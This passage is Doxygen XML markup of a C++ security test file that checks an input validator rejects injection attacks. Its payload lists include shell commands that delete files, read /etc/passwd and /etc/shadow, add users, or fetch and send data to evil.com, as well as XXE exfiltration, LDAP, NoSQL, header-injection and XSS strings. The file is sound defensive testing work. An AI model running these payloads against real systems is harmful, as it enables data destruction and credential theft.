+<codeline lineno="103"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>CommandInjection_ShellCommands)<sp/>{</highlight></codeline>
+<codeline lineno="104"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>command_injections<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="105"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;file.txt;<sp/>rm<sp/>-rf<sp/>/&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="106"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;|<sp/>cat<sp/>/etc/passwd&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="107"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&amp;<sp/>net<sp/>user<sp/>attacker<sp/>password<sp/>/add&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="108"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;`whoami`&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="109"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;$(cat<sp/>/etc/shadow)&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="110"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&amp;&amp;<sp/>wget<sp/>http://evil.com/backdoor.sh<sp/>|<sp/>sh&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="111"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;;<sp/>curl<sp/>http://evil.com?data=$(cat<sp/>/etc/passwd)&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="112"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="113"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="114"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>cmd<sp/>:<sp/>command_injections)<sp/>{</highlight></codeline>
+<codeline lineno="115"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateFilename(cmd);</highlight></codeline>
+<codeline lineno="116"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="117"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Command<sp/>injection<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>cmd;</highlight></codeline>
+<codeline lineno="118"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="119"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="120"><highlight class="normal"></highlight></codeline>
+<codeline lineno="124"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>NoSQLInjection_MongoDBStyle)<sp/>{</highlight></codeline>
+<codeline lineno="125"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>While<sp/>ThemisDB<sp/>uses<sp/>AQL,<sp/>test<sp/>against<sp/>common<sp/>NoSQL<sp/>injection<sp/>patterns</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="126"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>nosql_injections<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="127"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;{&apos;$gt&apos;:<sp/>&apos;&apos;}&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="128"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;{&apos;$ne&apos;:<sp/>null}&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="129"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;&apos;;<sp/>return<sp/>true;<sp/>var<sp/>dummy=&apos;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="130"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;admin&apos;<sp/>||<sp/>&apos;a&apos;==&apos;a&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="131"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;{&apos;username&apos;:<sp/>{&apos;$regex&apos;:<sp/>&apos;.*&apos;}}&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="132"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="133"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="134"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>injection<sp/>:<sp/>nosql_injections)<sp/>{</highlight></codeline>
+<codeline lineno="135"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateJSON(injection);</highlight></codeline>
+<codeline lineno="136"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Should<sp/>either<sp/>reject<sp/>or<sp/>safely<sp/>escape</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="137"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">if</highlight><highlight class="normal"><sp/>(is_safe)<sp/>{</highlight></codeline>
+<codeline lineno="138"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>If<sp/>accepted,<sp/>verify<sp/>it&apos;s<sp/>properly<sp/>escaped</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="139"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(injection.find(</highlight><highlight class="stringliteral">&quot;$gt&quot;</highlight><highlight class="normal">)<sp/>==<sp/>std::string::npos<sp/>||</highlight></codeline>
+<codeline lineno="140"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>injection.find(</highlight><highlight class="stringliteral">&quot;\\$gt&quot;</highlight><highlight class="normal">)<sp/>!=<sp/>std::string::npos)</highlight></codeline>
+<codeline lineno="141"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;MongoDB<sp/>operators<sp/>should<sp/>be<sp/>escaped&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="142"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="143"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="144"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="145"><highlight class="normal"></highlight></codeline>
+<codeline lineno="149"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>XXE_ExternalEntityInjection)<sp/>{</highlight></codeline>
+<codeline lineno="150"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>xxe_payloads<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="151"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>R</highlight><highlight class="stringliteral">&quot;(&lt;!DOCTYPE<sp/>foo<sp/>[&lt;!ENTITY<sp/>xxe<sp/>SYSTEM<sp/>&quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;)&quot;,</highlight></codeline>
+<codeline lineno="152"><highlight class="stringliteral"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>R</highlight><highlight class="stringliteral">&quot;(&lt;!DOCTYPE<sp/>foo<sp/>[&lt;!ENTITY<sp/>xxe<sp/>SYSTEM<sp/>&quot;http://evil.com/evil.dtd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;)&quot;,</highlight></codeline>
+<codeline lineno="153"><highlight class="stringliteral"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>R</highlight><highlight class="stringliteral">&quot;(&lt;!ENTITY<sp/>%<sp/>file<sp/>SYSTEM<sp/>&quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY<sp/>%<sp/>eval<sp/>&quot;&lt;!ENTITY<sp/>&amp;#x25;<sp/>exfil<sp/>SYSTEM<sp/>&apos;http://evil.com/?x=%file;&apos;&gt;&quot;&gt;%eval;%exfil;)&quot;</highlight></codeline>
+<codeline lineno="154"><highlight class="stringliteral"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="155"><highlight class="stringliteral"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="156"><highlight class="stringliteral"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>payload<sp/>:<sp/>xxe_payloads)<sp/>{</highlight></codeline>
+<codeline lineno="157"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateXML(payload);</highlight></codeline>
+<codeline lineno="158"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="159"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;XXE<sp/>payload<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>payload;</highlight></codeline>
+<codeline lineno="160"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="161"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="162"><highlight class="normal"></highlight></codeline>
+<codeline lineno="166"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>LDAPInjection_FilterBypass)<sp/>{</highlight></codeline>
+<codeline lineno="167"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>ldap_injections<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="168"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;*)(uid=*))(|(uid=*&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="169"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;admin)(&amp;(password=*))&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="170"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;*)(|(objectClass=*&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="171"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;*))(objectClass=*&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="172"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="173"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="174"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>injection<sp/>:<sp/>ldap_injections)<sp/>{</highlight></codeline>
+<codeline lineno="175"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateLDAPFilter(injection);</highlight></codeline>
+<codeline lineno="176"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="177"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;LDAP<sp/>injection<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>injection;</highlight></codeline>
+<codeline lineno="178"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="179"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="180"><highlight class="normal"></highlight></codeline>
+<codeline lineno="184"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>EmailInjection_HeaderInjection)<sp/>{</highlight></codeline>
+<codeline lineno="185"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>email_injections<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="186"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test@example.com\nBcc:<sp/>attacker@evil.com&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="187"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test@example.com\r\nCc:<sp/>spam@evil.com&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="188"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test@example.com%0ABcc:attacker@evil.com&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="189"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;test@example.com\nSubject:<sp/>Spam\nBody:<sp/>Evil<sp/>content&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="190"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="191"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="192"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>email<sp/>:<sp/>email_injections)<sp/>{</highlight></codeline>
+<codeline lineno="193"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateEmail(email);</highlight></codeline>
+<codeline lineno="194"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="195"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Email<sp/>injection<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>email;</highlight></codeline>
+<codeline lineno="196"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="197"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="198"><highlight class="normal"></highlight></codeline>
+<codeline lineno="202"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>URLInjection_OpenRedirect)<sp/>{</highlight></codeline>
+<codeline lineno="203"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>malicious_urls<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="204"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;javascript:alert(&apos;XSS&apos;)&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="205"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;data:text/html,&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="206"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;//evil.com/redirect&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="207"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;http://evil.com@good.com/&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="208"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;http://good.com?redirect=http://evil.com&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="209"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;file:///etc/passwd&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="210"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;ftp://anonymous@evil.com/&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="211"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="212"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="213"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>url<sp/>:<sp/>malicious_urls)<sp/>{</highlight></codeline>
+<codeline lineno="214"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateURL(url,<sp/>{</highlight><highlight class="stringliteral">&quot;http&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;https&quot;</highlight><highlight class="normal">});</highlight></codeline>
+<codeline lineno="215"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="216"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Malicious<sp/>URL<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>url;</highlight></codeline>
+<codeline lineno="217"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="218"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="219"><highlight class="normal"></highlight></codeline>
+<codeline lineno="223"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>BufferOverflow_ExcessiveLength)<sp/>{</highlight></codeline>
+<codeline lineno="224"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Test<sp/>with<sp/>extremely<sp/>long<sp/>inputs</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="225"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>very_long_string(10000000,<sp/></highlight><highlight class="charliteral">&apos;A&apos;</highlight><highlight class="normal">);<sp/><sp/></highlight><highlight class="comment">//<sp/>10MB<sp/>string</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="226"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="227"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateStringLength(very_long_string,<sp/>1024);</highlight></codeline>
+<codeline lineno="228"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Excessively<sp/>long<sp/>string<sp/>should<sp/>be<sp/>rejected&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="229"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="230"><highlight class="normal"></highlight></codeline>
+<codeline lineno="234"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>IntegerOverflow_BoundaryValues)<sp/>{</highlight></codeline>
+<codeline lineno="235"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;int64_t&gt;<sp/>overflow_values<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="236"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>INT64_MAX,</highlight></codeline>
+<codeline lineno="237"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>INT64_MIN,</highlight></codeline>
+<codeline lineno="238"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>-1,<sp/><sp/></highlight><highlight class="comment">//<sp/>When<sp/>unsigned<sp/>expected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="239"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="240"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="241"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>value<sp/>:<sp/>overflow_values)<sp/>{</highlight></codeline>
+<codeline lineno="242"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordtype">bool</highlight><highlight class="normal"><sp/>is_safe<sp/>=<sp/>validator_-&gt;validateIntegerRange(value,<sp/>0,<sp/>1000);</highlight></codeline>
+<codeline lineno="243"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_FALSE(is_safe)<sp/></highlight></codeline>
+<codeline lineno="244"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Out<sp/>of<sp/>range<sp/>integer<sp/>should<sp/>be<sp/>rejected:<sp/>&quot;</highlight><highlight class="normal"><sp/>&lt;&lt;<sp/>value;</highlight></codeline>
+<codeline lineno="245"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="246"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="247"><highlight class="normal"></highlight></codeline>
+<codeline lineno="251"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>FormatStringInjection_SpecialCharacters)<sp/>{</highlight></codeline>
+<codeline lineno="252"><highlight class="normal"><sp/><sp/><sp/><sp/>std::vector&lt;std::string&gt;<sp/>format_strings<sp/>=<sp/>{</highlight></codeline>
+<codeline lineno="253"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;%s%s%s%s%s%s%s%s%s%s&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="254"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;%x%x%x%x%x%x%x%x%x%x&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="255"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;%n%n%n%n%n%n%n%n%n%n&quot;</highlight><highlight class="normal">,</highlight></codeline>
+<codeline lineno="256"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="stringliteral">&quot;%08x.%08x.%08x.%08x&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="257"><highlight class="normal"><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="258"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="259"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">for</highlight><highlight class="normal"><sp/>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal">&amp;<sp/>fmt<sp/>:<sp/>format_strings)<sp/>{</highlight></codeline>
+<codeline lineno="260"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>std::string<sp/>sanitized<sp/>=<sp/>validator_-&gt;sanitizeLogMessage(fmt);</highlight></codeline>
+<codeline lineno="261"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="262"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="comment">//<sp/>Format<sp/>specifiers<sp/>should<sp/>be<sp/>escaped<sp/>or<sp/>removed</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="263"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>EXPECT_TRUE(sanitized.find(</highlight><highlight class="stringliteral">&quot;%n&quot;</highlight><highlight class="normal">)<sp/>==<sp/>std::string::npos)</highlight></codeline>
+<codeline lineno="264"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>&lt;&lt;<sp/></highlight><highlight class="stringliteral">&quot;Dangerous<sp/>format<sp/>specifiers<sp/>should<sp/>be<sp/>removed&quot;</highlight><highlight class="normal">;</highlight></codeline>
+<codeline lineno="265"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="266"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="267"><highlight class="normal"></highlight></codeline>
+<codeline lineno="271"><highlight class="normal"><ref refid="test__input__validation__security_8cpp_1a60c5053c505573491293657260c28ce1" kindref="member">TEST_F</ref>(<ref refid="class_input_validation_security_test" kindref="compound">InputValidationSecurityTest</ref>,<sp/>Unicode_NormalizationBypass)<sp/>{</highlight></codeline>
